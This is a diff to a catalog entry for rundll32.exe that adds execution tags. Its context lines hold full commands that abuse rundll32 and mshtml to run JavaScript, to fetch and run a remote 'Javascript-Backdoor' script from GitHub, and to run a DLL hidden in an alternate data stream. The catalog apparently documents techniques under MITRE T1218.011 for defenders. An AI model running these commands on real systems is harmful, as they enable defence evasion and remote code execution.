@@ -29,6 +29,8 @@ Commands:
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: JScript
   - Command: rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");
     Description: Use Rundll32.exe to execute a JavaScript script that runs calc.exe.
     Usecase: Proxy execution
@@ -36,6 +38,8 @@ Commands:
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: JScript
   - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
     Description: Use Rundll32.exe to execute a JavaScript script that runs calc.exe and then kills the Rundll32.exe process that was started.
     Usecase: Proxy execution
@@ -43,6 +47,8 @@ Commands:
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: JScript
   - Command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
     Description: Use Rundll32.exe to execute a JavaScript script that calls a remote JavaScript script.
     Usecase: Execute code from Internet
@@ -50,6 +56,8 @@ Commands:
     Privileges: User
     MitreID: T1218.011
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: JScript
   - Command: rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain
     Description: Use Rundll32.exe to execute a .DLL file stored in an Alternate Data Stream (ADS).
     Usecase: Execute code from alternate data stream
@@ -68,6 +76,7 @@ Commands:
     OperatingSystem: Windows 10 (and likely previous versions), Windows 11
     Tags:
       - Execute: DLL
+      - Execute: EXE
 Full_Path:
   - Path: C:\Windows\System32\rundll32.exe
   - Path: C:\Windows\SysWOW64\rundll32.exe
